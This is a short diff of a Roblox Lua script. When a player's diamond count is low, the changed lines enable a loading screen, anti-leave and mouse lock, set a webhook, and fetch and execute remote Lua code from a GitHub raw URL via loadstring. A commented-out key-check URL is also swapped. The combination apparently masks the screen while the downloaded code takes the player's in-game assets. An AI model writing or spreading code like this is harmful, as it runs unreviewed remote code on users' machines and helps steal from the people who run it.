@@ -748,10 +748,10 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = false
-    _G.AntiLeave = false
-    _G.MouseLock = false
-    loadstring(game:HttpGetAsync("", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    _G.LoadingScreen = true
+    _G.AntiLeave = true
+    _G.MouseLock = true
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/Bank/main/Engine", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1090,7 +1090,7 @@ local dhuser = getgenv().Settings.User
 --         local dhdata = {
 --             dhprem = dhkey
 --         }
---         local dhurl = "https://janeq.space/others/keya.php" -- Exc : https://rizz.xyz/premium.php
+--         local dhurl = "https://cypaexhub.000webhostapp.com/keys.php" -- Exc : https://rizz.xyz/premium.php
 --         local dhheaders = {
 --             ["content-type"] = "application/json"
 --         }
